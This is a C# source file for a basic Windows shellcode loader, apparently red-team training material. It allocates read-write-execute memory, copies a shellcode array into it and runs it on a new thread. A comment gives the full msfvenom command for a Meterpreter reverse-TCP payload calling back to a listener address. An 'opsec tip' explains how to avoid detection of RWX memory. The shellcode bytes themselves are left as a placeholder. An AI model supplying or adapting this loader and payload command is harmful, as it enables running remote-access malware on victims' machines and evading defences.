using System;
using System.Runtime.InteropServices;

namespace Loader
{
    public class BasicShellcodeLoader
    {
        // P/Invoke definitions to interface with the Windows API
        
        // https://pinvoke.net/default.aspx/kernel32/VirtualAlloc.html
        public const uint EXECUTEREADWRITE = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        // https://pinvoke.net/default.aspx/kernel32/CreateThread.html
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        // https://pinvoke.net/default.aspx/kernel32/WaitForSingleObject.html
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, Int32 dwMilliseconds);

        public static void Main()
        {

            // Define our shellcode as a csharp byte array
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f csharp -o met.cs
            // CODE

            // In this example, we use VirtualAlloc() to allocate memory for our shellcode and copy it
            // An equally suitable alternative would be to make our shellcode executable directly using VirtualProtect()
			
			Console.WriteLine("[+] Allocate memory in the current process");
            // Allocate RWX (read-write-execute) memory to execute the shellcode from
            // Opsec tip: RWX memory can easily be detected. Consider making memory RW first, then RX after writing your shellcode
            int scSize = buf.Length;
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, scSize, COMMIT_RESERVE, EXECUTEREADWRITE);
			
			Console.WriteLine("[+] Copying shellcode into allocated memory space");
            // Copy the shellcode into our assigned region of RWX memory
            Marshal.Copy(buf, 0, payAddr, scSize);
			
			Console.WriteLine("[+] Creating thread and running...catch your shell");
            // Create a thread at the start of the executable shellcode to run it!
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);

            // Wait for our thread to exit to prevent program from closing before the shellcode ends
            // This is especially relevant for long-running shellcode, such as malware implants
            uint waitResult = WaitForSingleObject(payThreadId, -1);
        }
    }
}